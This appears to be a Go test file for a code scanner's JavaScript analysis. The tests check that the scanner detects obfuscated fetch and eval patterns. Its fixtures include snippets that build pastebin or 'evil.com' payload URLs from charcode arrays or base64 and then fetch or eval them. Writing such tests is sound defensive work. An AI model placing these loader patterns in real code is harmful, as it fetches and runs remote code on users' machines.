package js

import (
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/infra/scan/ast"
)

func newScanner(t *testing.T) *Scanner {
	t.Helper()
	s, err := New()
	if err != nil {
		t.Fatalf("New(): %v", err)
	}
	return s
}

func hasCapability(f *ast.Findings, c domain.Capability) bool {
	_, ok := f.Capabilities[c]
	return ok
}

// TestTaint_CharCodeArray verifies constant folding:
// const a = [104,116,116,112]; const b = String.fromCharCode(...a);
// fetch(b + "s://pastebin.com/raw/abc");
// → suspicious-url detected via constant fold of charcode array
func TestTaint_CharCodeArray_SuspiciousURL(t *testing.T) {
	src := []byte(`
const a = [112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109];
const host = String.fromCharCode(...a);
fetch("https://" + host + "/raw/payload");
`)
	s := newScanner(t)
	f := ast.NewFindings()
	s.AnalyzeFile("evil.js", src, f)

	if !hasCapability(f, domain.CapSuspiciousURL) {
		t.Error("want suspicious-url from constant-folded charcode array, got none")
	}
	if !hasCapability(f, domain.CapNetEgress) {
		t.Error("want net-egress from fetch(), got none")
	}
}

// TestTaint_AtobToEval verifies taint tracking:
// const x = atob("..."); eval(x); → dynamic-eval
func TestTaint_AtobToEval(t *testing.T) {
	src := []byte(`
const payload = atob("ZXZpbC5jb20vcGF5bG9hZA==");
eval(payload);
`)
	s := newScanner(t)
	f := ast.NewFindings()
	s.AnalyzeFile("evil.js", src, f)

	// atob already gives base64-decode; taint tracking should add dynamic-eval
	if !hasCapability(f, domain.CapBase64Decode) {
		t.Error("want base64-decode from atob(), got none")
	}
	if !hasCapability(f, domain.CapDynamicEval) {
		t.Error("want dynamic-eval from taint(atob → eval), got none")
	}
}

// TestTaint_BufferBase64ToFetch verifies taint tracking:
// const url = Buffer.from("...", "base64").toString(); fetch(url);
func TestTaint_BufferBase64ToFetch(t *testing.T) {
	src := []byte(`
const url = Buffer.from("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2V2aWw=", "base64").toString();
fetch(url);
`)
	s := newScanner(t)
	f := ast.NewFindings()
	s.AnalyzeFile("evil.js", src, f)

	if !hasCapability(f, domain.CapBase64Decode) {
		t.Error("want base64-decode from Buffer.from base64, got none")
	}
	if !hasCapability(f, domain.CapNetEgress) {
		t.Error("want net-egress from fetch(), got none")
	}
}

// TestTaint_InlineCharCode verifies constant folding for inline call:
// eval(String.fromCharCode(101,118,105,108)) → dynamic-eval
func TestTaint_InlineCharCode_Eval(t *testing.T) {
	src := []byte(`
eval(String.fromCharCode(101, 118, 105, 108));
`)
	s := newScanner(t)
	f := ast.NewFindings()
	s.AnalyzeFile("evil.js", src, f)

	// eval() directly detected by existing query
	if !hasCapability(f, domain.CapDynamicEval) {
		t.Error("want dynamic-eval, got none")
	}
}

// TestTaint_CleanCode_NoFalsePositive ensures normal code doesn't trigger.
func TestTaint_CleanCode_NoFalsePositive(t *testing.T) {
	src := []byte(`
const chars = [65, 66, 67]; // "ABC" — not suspicious
const s = String.fromCharCode(...chars);
console.log(s);

const encoded = Buffer.from("hello world", "utf8").toString("base64");
console.log(encoded);
`)
	s := newScanner(t)
	f := ast.NewFindings()
	s.AnalyzeFile("clean.js", src, f)

	if hasCapability(f, domain.CapSuspiciousURL) {
		t.Error("false positive: suspicious-url on clean code")
	}
	if hasCapability(f, domain.CapDynamicEval) {
		t.Error("false positive: dynamic-eval on clean code")
	}
}
